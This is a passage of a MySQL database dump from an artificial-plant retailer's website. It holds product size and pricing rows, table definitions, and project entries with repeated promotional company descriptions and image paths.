INSERT INTO `product_sizes` (`id`, `pid`, `size_id`, `mrp`, `selling_price`, `sel_dollar`, `b2b_selling_price`, `b2b_sel_dollar`, `stock`, `minimum_buy`, `status`, `user_id`, `created_date`, `modified_date`, `image`) VALUES
(1, 1, 97, 300, 250, 20, 0, 0, 10, 1, 0, 1, '2022-04-05 09:15:44', '2022-04-06 05:40:46', ''),
(4, 2, 76, 116, 116, 0, 0, 0, 0, 1, 0, 1, '2022-04-06 10:53:25', '2022-08-03 04:59:26', ''),
(3, 1, 94, 250, 200, 20, 0, 0, 20, 1, 0, 1, '2022-04-06 05:23:40', '2022-04-06 05:40:46', ''),
(5, 3, 76, 116, 116, 0, 0, 0, 0, 0, 0, 1, '2022-04-06 11:55:18', '2022-08-03 05:00:47', ''),
(6, 4, 76, 53, 53, 0, 0, 0, 25, 0, 0, 1, '2022-04-06 12:04:01', '2022-08-03 05:01:12', ''),
(7, 5, 76, 116, 116, 0, 0, 0, 0, 0, 0, 1, '2022-04-06 12:08:58', '2022-08-03 05:01:50', ''),
(8, 6, 76, 116, 116, 0, 0, 0, 0, 5, 0, 1, '2022-04-06 12:10:50', '2022-08-03 05:02:22', ''),
(9, 7, 76, 116, 116, 0, 0, 0, 0, 0, 0, 1, '2022-04-06 12:14:38', '2022-08-03 05:02:53', ''),
(10, 8, 76, 116, 116, 0, 0, 0, 0, 5, 0, 1, '2022-04-06 12:19:18', '2022-08-03 05:03:30', ''),
(11, 9, 76, 132, 132, 0, 0, 0, 10, 0, 0, 1, '2022-04-06 12:22:33', '2022-08-03 05:03:58', ''),
(12, 10, 76, 116, 116, 0, 0, 0, 10, 0, 0, 1, '2022-04-06 12:27:07', '2022-08-03 05:05:17', ''),
(13, 11, 76, 116, 116, 0, 0, 0, 0, 5, 0, 1, '2022-04-06 12:30:48', '2022-08-03 05:06:14', ''),
(14, 12, 76, 313, 313, 0, 0, 0, 10, 0, 0, 1, '2022-04-07 03:51:50', '2022-08-03 05:07:18', ''),
(15, 13, 76, 116, 116, 0, 0, 0, 0, 0, 0, 1, '2022-04-07 03:56:44', '2022-08-03 05:07:50', ''),
(16, 14, 76, 170, 170, 0, 0, 0, 10, 0, 0, 1, '2022-04-07 04:00:55', '2022-08-03 05:10:04', ''),
(17, 15, 76, 116, 116, 0, 0, 0, 0, 0, 0, 1, '2022-04-07 04:04:16', '2022-08-03 05:10:35', ''),
(18, 16, 76, 116, 116, 0, 0, 0, 10, 0, 0, 1, '2022-04-07 04:07:36', '2022-08-03 05:11:02', ''),
(19, 17, 76, 116, 116, 0, 0, 0, 15, 0, 0, 1, '2022-04-07 04:19:06', '2022-08-03 05:11:27', ''),
(20, 18, 76, 116, 116, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 04:21:21', '2022-08-03 05:11:53', ''),
(21, 19, 76, 116, 116, 0, 0, 0, 0, 10, 0, 1, '2022-04-07 04:33:08', '2022-08-03 05:12:32', ''),
(22, 20, 76, 116, 116, 0, 0, 0, 25, 5, 0, 1, '2022-04-07 04:37:23', '2022-08-03 05:12:58', ''),
(23, 21, 76, 300, 300, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 04:40:12', '2022-08-03 05:13:54', ''),
(24, 22, 76, 116, 116, 0, 0, 0, 25, 5, 0, 1, '2022-04-07 04:43:24', '2022-08-03 05:14:42', ''),
(25, 23, 76, 150, 150, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 04:47:19', '2022-08-03 05:17:42', ''),
(26, 24, 76, 150, 150, 0, 0, 0, 0, 10, 0, 1, '2022-04-07 04:49:46', '2022-11-11 11:00:19', ''),
(27, 25, 76, 130, 130, 0, 0, 0, 0, 10, 0, 1, '2022-04-07 04:52:19', '2022-11-11 11:00:05', ''),
(28, 26, 118, 200, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 05:59:48', '2022-04-12 12:02:42', ''),
(29, 27, 118, 250, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 06:03:42', '2022-04-12 10:51:44', ''),
(30, 28, 118, 200, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 06:05:13', '2022-04-12 10:49:57', ''),
(31, 29, 118, 200, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 06:07:51', '2022-06-01 10:23:22', ''),
(32, 30, 118, 200, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 06:11:33', '2022-04-12 10:39:49', ''),
(33, 31, 118, 250, 250, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 06:14:30', '2022-04-12 10:37:40', ''),
(34, 32, 118, 200, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 06:16:02', '2022-06-15 12:15:16', ''),
(35, 33, 118, 300, 300, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 06:17:41', '2022-04-12 10:32:10', ''),
(36, 34, 118, 200, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 06:19:17', '2022-04-12 10:29:50', ''),
(37, 35, 118, 200, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 06:22:11', '2022-04-12 10:28:22', ''),
(38, 36, 107, 200, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 06:48:36', '2022-04-13 09:38:35', ''),
(39, 37, 107, 230, 230, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 06:52:23', '2022-04-13 09:37:16', ''),
(40, 38, 107, 350, 350, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 06:58:15', '2022-04-13 09:33:54', ''),
(41, 39, 107, 250, 250, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 07:02:10', '2022-04-13 09:32:22', ''),
(42, 40, 106, 150, 150, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 07:12:00', '2022-07-18 10:25:25', ''),
(43, 41, 93, 100, 100, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 07:23:56', '2022-07-26 12:15:25', ''),
(44, 42, 106, 68, 68, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 07:27:45', '2022-08-03 05:23:05', ''),
(45, 43, 76, 100, 100, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 07:31:48', '2022-07-27 06:14:26', ''),
(46, 44, 76, 260, 260, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 07:42:29', '2022-07-27 06:05:10', ''),
(47, 45, 107, 100, 100, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 07:45:01', '2022-07-18 10:26:14', ''),
(48, 46, 123, 66, 66, 0, 0, 0, 10, 0, 0, 1, '2022-04-07 08:55:00', '2022-11-22 10:05:13', ''),
(49, 47, 113, 127, 127, 85, 0, 0, 10, 0, 0, 1, '2022-04-07 08:59:17', '2022-08-03 05:41:45', ''),
(50, 48, 113, 200, 100, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 09:05:09', '2022-08-03 05:40:09', ''),
(51, 49, 110, 85, 85, 0, 0, 0, 5, 5, 0, 1, '2022-04-07 09:11:49', '2022-08-03 05:40:51', ''),
(52, 50, 110, 127, 127, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 09:15:07', '2022-08-03 05:41:14', ''),
(53, 51, 110, 60, 60, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 09:17:30', '2022-07-18 10:28:23', ''),
(54, 52, 83, 90, 90, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 09:39:05', '2022-08-03 05:24:44', ''),
(55, 53, 112, 106, 106, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 09:43:11', '2022-08-03 05:25:20', ''),
(56, 54, 124, 191, 100, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 09:52:36', '2022-08-03 05:36:17', ''),
(57, 55, 81, 70, 70, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 09:58:25', '2022-08-03 05:36:38', ''),
(58, 56, 85, 81, 81, 0, 0, 0, 5, 5, 0, 1, '2022-04-07 10:04:06', '2022-08-03 05:37:02', ''),
(59, 57, 79, 70, 70, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 10:06:06', '2022-08-03 05:37:26', ''),
(60, 58, 79, 70, 70, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 10:12:33', '2022-08-03 05:37:55', ''),
(61, 59, 111, 200, 200, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 10:15:46', '2022-07-26 05:14:41', ''),
(62, 60, 81, 263, 263, 0, 0, 0, 10, 5, 0, 1, '2022-04-07 10:18:23', '2022-08-03 05:38:19', ''),
(63, 61, 110, 180, 180, 0, 0, 0, 0, 5, 0, 1, '2022-04-07 10:20:38', '2022-07-18 10:27:35', ''),
(64, 62, 114, 200, 200, 0, 0, 0, 10, 0, 0, 1, '2022-04-07 12:08:49', '2022-04-14 04:33:51', ''),
(65, 63, 110, 150, 150, 0, 0, 0, 10, 0, 0, 1, '2022-04-07 12:12:15', '2022-04-14 04:33:02', ''),
(66, 64, 110, 100, 100, 0, 0, 0, 10, 0, 0, 1, '2022-04-07 12:15:34', '2022-04-14 04:32:17', ''),
(67, 65, 110, 170, 170, 0, 0, 0, 10, 0, 0, 1, '2022-04-07 12:18:46', '2022-04-14 04:31:25', ''),
(68, 66, 107, 50, 50, 0, 0, 0, 10, 0, 0, 1, '2022-04-07 12:23:26', '2022-04-14 04:29:18', ''),
(69, 67, 113, 30, 30, 0, 0, 0, 10, 0, 0, 1, '2022-04-07 12:26:04', '2022-04-14 04:27:36', ''),
(70, 68, 110, 200, 200, 0, 0, 0, 10, 0, 0, 1, '2022-04-07 12:29:11', '2022-04-07 12:29:11', ''),
(71, 69, 110, 35, 35, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 04:02:23', '2022-04-08 04:05:54', ''),
(72, 69, 114, 60, 60, 0, 0, 0, 10, 3, 0, 1, '2022-04-08 04:02:23', '2022-04-08 04:05:54', ''),
(73, 70, 97, 70, 70, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 04:09:09', '2022-04-08 04:09:09', ''),
(74, 71, 108, 100, 100, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 04:11:21', '2022-04-08 04:11:21', ''),
(75, 72, 97, 200, 200, 0, 0, 0, 10, 2, 0, 1, '2022-04-08 04:16:23', '2022-06-02 09:57:20', ''),
(76, 73, 108, 200, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 04:21:26', '2022-06-02 09:54:49', ''),
(77, 74, 110, 50, 50, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 04:25:22', '2022-06-02 10:01:54', ''),
(78, 75, 110, 40, 40, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 04:27:29', '2022-06-07 04:52:18', ''),
(79, 76, 126, 53, 53, 0, 0, 0, 10, 0, 0, 1, '2022-04-08 04:36:11', '2022-11-11 10:57:16', ''),
(80, 77, 125, 64, 64, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 04:44:05', '2022-11-07 12:36:06', ''),
(81, 78, 121, 200, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 04:47:03', '2022-06-02 10:31:13', ''),
(82, 79, 108, 200, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 04:48:15', '2022-06-02 10:34:16', ''),
(83, 80, 121, 150, 150, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 04:49:34', '2022-06-02 10:36:05', ''),
(84, 81, 120, 250, 250, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 04:50:53', '2022-04-08 05:13:31', ''),
(85, 82, 121, 102, 102, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 04:52:18', '2022-10-27 11:54:24', ''),
(86, 83, 120, 200, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 09:35:06', '2022-06-02 10:10:58', ''),
(87, 84, 113, 150, 150, 0, 0, 0, 0, 5, 0, 1, '2022-04-08 09:42:25', '2022-07-18 10:28:42', ''),
(88, 85, 119, 250, 250, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 09:46:11', '2022-04-08 09:46:11', ''),
(89, 86, 113, 100, 100, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 09:50:07', '2022-07-16 10:24:09', ''),
(90, 87, 115, 200, 200, 0, 0, 0, 10, 5, 0, 1, '2022-04-08 10:00:12', '2022-06-02 10:15:34', ''),
(91, 88, 110, 0, 0, 0, 0, 0, 30, 0, 0, 1, '2022-06-27 06:27:24', '2022-07-14 07:24:45', ''),
(92, 89, 121, 64, 64, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 05:51:42', '2022-11-07 12:16:03', ''),
(93, 90, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, '2022-07-18 06:30:13', '2022-07-18 06:30:13', ''),
(94, 91, 110, 136, 136, 0, 0, 0, 10, 1, 0, 1, '2022-07-18 06:36:26', '2022-11-15 05:39:02', ''),
(95, 92, 121, 66, 0, 0, 0, 0, 50, 0, 0, 1, '2022-07-18 07:06:27', '2022-07-18 07:07:46', ''),
(96, 93, 121, 66, 0, 0, 0, 0, 50, 0, 0, 1, '2022-07-18 07:15:20', '2022-07-18 07:25:04', ''),
(97, 94, 121, 66, 0, 0, 0, 0, 0, 0, 0, 1, '2022-07-18 07:23:24', '2022-07-18 07:47:27', ''),
(98, 95, 121, 66, 66, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 07:30:32', '2022-10-27 12:07:03', ''),
(99, 96, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, '2022-07-18 07:31:54', '2022-07-18 07:32:22', ''),
(100, 97, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, '2022-07-18 08:30:59', '2022-07-18 08:35:48', ''),
(101, 98, 121, 60, 0, 0, 0, 0, 0, 0, 0, 1, '2022-07-18 08:44:46', '2022-07-18 10:00:39', ''),
(102, 99, 121, 77, 77, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 08:57:36', '2022-10-27 12:10:53', ''),
(103, 100, 125, 64, 64, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 09:01:42', '2022-11-07 12:35:17', ''),
(104, 101, 121, 77, 77, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 09:12:18', '2022-10-27 11:58:43', ''),
(105, 102, 125, 64, 64, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 09:16:52', '2022-11-07 12:35:44', ''),
(106, 103, 125, 64, 64, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 09:21:47', '2022-11-07 12:32:50', ''),
(107, 104, 125, 64, 64, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 09:26:03', '2022-11-07 12:34:18', ''),
(108, 105, 125, 64, 64, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 09:30:43', '2022-11-07 12:36:50', ''),
(109, 106, 125, 64, 64, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 09:35:52', '2022-11-07 12:33:33', ''),
(110, 107, 121, 0, 0, 0, 0, 0, 50, 0, 0, 1, '2022-07-18 09:48:35', '2022-07-18 09:56:51', ''),
(111, 108, 125, 87, 87, 0, 0, 0, 10, 1, 0, 1, '2022-07-18 10:17:04', '2022-11-08 05:38:39', ''),
(112, 109, 125, 64, 64, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 10:43:28', '2022-11-07 12:22:04', ''),
(113, 110, 125, 64, 64, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 10:45:17', '2022-11-07 12:22:31', ''),
(114, 111, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, '2022-07-18 10:49:46', '2022-07-18 10:49:46', ''),
(115, 112, 125, 64, 64, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 10:51:42', '2022-11-07 12:23:22', ''),
(116, 113, 125, 64, 64, 0, 0, 0, 10, 0, 0, 1, '2022-07-18 10:54:33', '2022-11-07 12:37:12', ''),
(119, 115, 119, 310, 310, 0, 0, 0, 0, 0, 0, 1, '2022-08-03 05:33:57', '2022-08-10 06:34:21', ''),
(118, 114, 129, 189, 189, 0, 0, 0, 10, 0, 0, 1, '2022-07-20 07:18:52', '2022-11-11 10:57:34', ''),
(120, 116, 119, 250, 250, 0, 0, 0, 0, 0, 0, 1, '2022-08-03 05:35:13', '2022-08-10 06:35:06', ''),
(121, 117, 119, 250, 250, 0, 0, 0, 0, 0, 0, 1, '2022-08-03 05:35:58', '2022-08-10 06:36:00', ''),
(122, 118, 119, 320, 320, 0, 0, 0, 0, 0, 0, 1, '2022-08-03 09:54:39', '2022-08-10 06:37:48', ''),
(123, 119, 119, 310, 310, 0, 0, 0, 0, 0, 0, 1, '2022-08-03 09:55:25', '2022-08-10 06:39:22', ''),
(124, 120, 113, 240, 240, 0, 0, 0, 0, 0, 0, 1, '2022-08-03 09:58:41', '2022-08-10 06:43:18', ''),
(125, 121, 0, 180, 180, 0, 0, 0, 0, 0, 0, 1, '2022-08-03 11:33:43', '2022-08-10 06:46:04', ''),
(126, 122, 119, 280, 280, 0, 0, 0, 0, 0, 0, 1, '2022-08-03 11:34:32', '2022-08-10 06:47:43', ''),
(127, 123, 119, 150, 150, 0, 0, 0, 0, 0, 0, 1, '2022-08-03 11:35:17', '2022-09-26 11:27:46', ''),
(128, 124, 0, 300, 280, 23, 0, 0, 10, 1, 0, 1, '2022-09-26 09:53:47', '2022-09-26 09:53:47', './assets/images/gog01664186027.jpg'),
(129, 124, 0, 450, 250, 20, 0, 0, 10, 1, 0, 1, '2022-09-26 09:53:47', '2022-09-26 09:53:47', 'assets/images/gog11664186027.jpg'),
(130, 125, 123, 300, 280, 23, 0, 0, 10, 1, 0, 1, '2022-09-26 11:28:27', '2022-09-27 10:11:48', 'assets/images/gog01664192924.jpg'),
(131, 125, 81, 333, 300, 23, 0, 0, 10, 1, 0, 1, '2022-09-27 09:41:39', '2022-09-27 10:11:48', 'assets/images/gog11664271699.jpg'),
(132, 126, 125, 80, 80, 0, 0, 0, 100, 0, 0, 1, '2022-11-08 07:30:02', '2022-11-11 10:58:58', ''),
(133, 127, 125, 65, 65, 0, 0, 0, 10, 0, 0, 1, '2022-11-11 10:08:46', '2022-11-11 10:08:46', ''),
(134, 128, 125, 64, 64, 0, 0, 0, 10, 0, 0, 1, '2022-11-11 10:10:49', '2022-11-11 10:10:49', ''),
(135, 129, 125, 64, 64, 0, 0, 0, 10, 0, 0, 1, '2022-11-11 10:19:02', '2022-11-11 10:19:02', ''),
(136, 76, 128, 96, 96, 0, 0, 0, 10, 0, 0, 1, '2022-11-11 10:46:35', '2022-11-11 10:57:16', ''),
(137, 76, 127, 66, 66, 0, 0, 0, 10, 0, 0, 1, '2022-11-11 10:46:35', '2022-11-11 10:57:16', ''),
(138, 76, 129, 121, 121, 0, 0, 0, 10, 0, 0, 1, '2022-11-11 10:46:35', '2022-11-11 10:57:16', ''),
(139, 114, 127, 100, 100, 0, 0, 0, 10, 0, 0, 1, '2022-11-11 10:48:10', '2022-11-11 10:57:34', ''),
(140, 114, 128, 161, 161, 0, 0, 0, 10, 0, 0, 1, '2022-11-11 10:48:10', '2022-11-11 10:57:34', ''),
(141, 114, 126, 86, 86, 0, 0, 0, 10, 0, 0, 1, '2022-11-11 10:48:10', '2022-11-11 10:57:34', ''),
(142, 130, 132, 11, 11, 0, 0, 0, 10, 0, 0, 1, '2022-11-11 10:55:03', '2022-11-15 05:41:47', ''),
(143, 130, 131, 9, 9, 0, 0, 0, 10, 0, 0, 1, '2022-11-11 10:56:02', '2022-11-15 05:41:47', ''),
(145, 131, 114, 181, 181, 0, 0, 0, 10, 1, 0, 1, '2022-11-15 05:41:24', '2022-11-15 05:41:39', ''),
(146, 132, 125, 215, 215, 0, 0, 0, 10, 1, 0, 1, '2022-11-22 10:14:01', '2022-11-22 10:15:41', '');

-- --------------------------------------------------------

--
-- Table structure for table `product_spec`
--

CREATE TABLE `product_spec` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `spec_name` text NOT NULL,
  `spec_val` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `product_vase`
--

CREATE TABLE `product_vase` (
  `pid` int(11) NOT NULL,
  `vase_id` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `project`
--

CREATE TABLE `project` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `status` int(11) NOT NULL,
  `date` text NOT NULL,
  `venue` text NOT NULL,
  `desc` text NOT NULL,
  `type` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `project`
--

INSERT INTO `project` (`id`, `name`, `status`, `date`, `venue`, `desc`, `type`) VALUES
(19, 'Treat to the Eye', 0, '09/07/2008', '<p style=\"text-align: justify;\">Chithrakala Parishath, Bangalore</p>\n', '<p>Kusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors ,Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp;</p>\n', 0),
(20, 'Joy of Flowers', 0, '01/07/2015', '<p style=\"text-align: justify;\">#8, Jewellers Street, Off Commercial Street, Opp KFC Cross Road, Bangalore - 560 001</p>\n', '<p>Kusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors ,Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects.</p>\n', 0),
(23, 'Mungaru Male', 0, '09/07/2008', '<p style=\"text-align: justify;\">Chithrakala Parishath, Bangalore</p>\n', '<p>Kusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors ,Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp; tremendous Creativity. Kusal has opened its branches in major metros like Chennai and Hyderabad with a team working on high profile projects. And as our client say if its about GREEN kusal is the only name, and word of mouth is leading our business.</p>\n', 0),
(21, 'These Artificial Plants are real Beauties', 0, '09/07/2015', '<p style=\"text-align: justify;\">Chithrakala Parishath, Bangalore</p>\n', '<p style=\"text-align:justify\">Kusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors ,Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp; tremendous Creativity. Kusal has opened its branches in major metros like Chennai and Hyderabad with a team working on high profile projects. And as our client say if its about GREEN kusal is the only name, and word of mouth is leading our business. Our experienced professionals visualize and customize plants and floral arrangements for larger projects, besides Homes and Offices and as our slogan apparently says,</p>\n', 0),
(22, 'Riot of Colours', 0, '09/07/2008', '<p style=\"text-align:justify\">Chithrakala Parishath, bangalore</p>\n', '<p style=\"text-align:justify\">Kusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors ,Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp; tremendous Creativity. Kusal has opened its branches in major metros like Chennai and Hyderabad with a team working on high profile projects. And as our client say if its about GREEN kusal is the only name, and word of mouth is leading our business.</p>\n', 0),
(24, 'Artificial Blooms', 0, '11/07/2008', '<p>Chithrakala Parishath, Bangalore</p>\n', '<p>Kusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors ,Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp; tremendous Creativity. Kusal has opened its branches in major metros like Chennai and Hyderabad with a team working on high profile projects. And as our client say if its about GREEN kusal is the only name, and word of mouth is leading our business.</p>\n', 0),
(25, 'Artists\' Paradise', 0, '12/07/2008', '<p>Bangalore</p>\n', '<p>Kusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors ,Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp; tremendous Creativity. Kusal has opened its branches in major metros like Chennai and Hyderabad with a team working on high profile projects. And as our client say if its about GREEN kusal is the only name, and word of mouth is leading our business.</p>\n', 1),
(26, 'Rare Flowers', 0, '09/07/2008', '<p>Chithrakala Parishath, Bangalore</p>\n\n<p>&nbsp;</p>\n', '<p>Kusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors ,Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp; tremendous Creativity. Kusal has opened its branches in major metros like Chennai and Hyderabad with a team working on high profile projects. And as our client say if its about GREEN kusal is the only name, and word of mouth is leading our business.</p>\n', 1),
(27, 'Mungaaru Male flowers', 0, '10/07/2008', '<p>Chithrakala Parishath, Bangalore</p>\n', '<p>Kusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors ,Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp; tremendous Creativity. Kusal has opened its branches in major metros like Chennai and Hyderabad with a team working on high profile projects. And as our client say if its about GREEN kusal is the only name, and word of mouth is leading our business.</p>\n', 0),
(28, 'Flower Blooms', 0, '08/07/2008', '<p>Chithrakala Parishath, Bangalore</p>\n', '<p><br />\nKusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors ,Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp; tremendous Creativity. Kusal has opened its branches in major metros like Chennai and Hyderabad with a team working on high profile projects. And as our client say if its about GREEN kusal is the only name, and word of mouth is leading our business.</p>\n', 0),
(29, 'Colourfull flowers', 0, '09/07/2008', '<p>Chithrakala Parishath, Bangalore</p>\n\n<p>&nbsp;</p>\n', '<p><br />\nKusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors ,Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp; tremendous Creativity. Kusal has opened its branches in major metros like Chennai and Hyderabad with a team working on high profile projects. And as our client say if its about GREEN kusal is the only name, and word of mouth is leading our business.</p>\n', 0),
(30, 'Kruthika Pushpa', 0, '11/07/2008', '<p>Chithrakala Parishath, Bangalore</p>\n\n<p>&nbsp;</p>\n', '<p>Kusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors ,Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp; tremendous Creativity. Kusal has opened its branches in major metros like Chennai and Hyderabad with a team working on high profile projects. And as our client say if its about GREEN kusal is the only name, and word of mouth is leading our business.</p>\n', 0);

-- --------------------------------------------------------

--
-- Table structure for table `project_img`
--

CREATE TABLE `project_img` (
  `id` int(11) NOT NULL,
  `project_id` int(11) NOT NULL,
  `path` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `project_img`
--

INSERT INTO `project_img` (`id`, `project_id`, `path`) VALUES
(140, 18, 'assets/project_images/14452006665.jpg'),
(139, 18, 'assets/project_images/14452006274.jpg'),
(138, 18, 'assets/project_images/14452009263.jpg'),
(137, 18, 'assets/project_images/14452004772.jpg'),
(136, 18, 'assets/project_images/14452003541.jpg'),
(135, 18, 'assets/project_images/14452011770.jpg'),
